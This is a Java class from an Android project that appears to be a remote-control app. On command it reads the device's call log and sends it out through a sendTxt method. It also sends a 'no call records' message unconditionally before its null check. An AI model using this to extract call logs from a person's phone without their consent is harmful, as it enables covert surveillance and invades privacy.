package com.lfish.control.action.actiondomian;

import com.lfish.control.ControlApplication;
import com.lfish.control.action.BaseBeanAction;
import com.lfish.control.action.actiontool.CLLog;
import com.lfish.control.action.actiontool.Utils;

public class GetCallRecodeAction extends BaseBeanAction {

	@Override
	public void run() {
		// TODO Auto-generated method stub
		if (Utils.isSDCardPathAvailable(ControlApplication.context)) {
			CLLog callRecode = new CLLog(ControlApplication.context);
			if(callRecode!=null)
			{
				String cl = callRecode.getCL();
				sendTxt("无通话记录");
				if(cl==null){
					return;
				}
				sendTxt(cl);
			}
		}else{
			sendTxt("SD卡不可用");
		}
	}

}
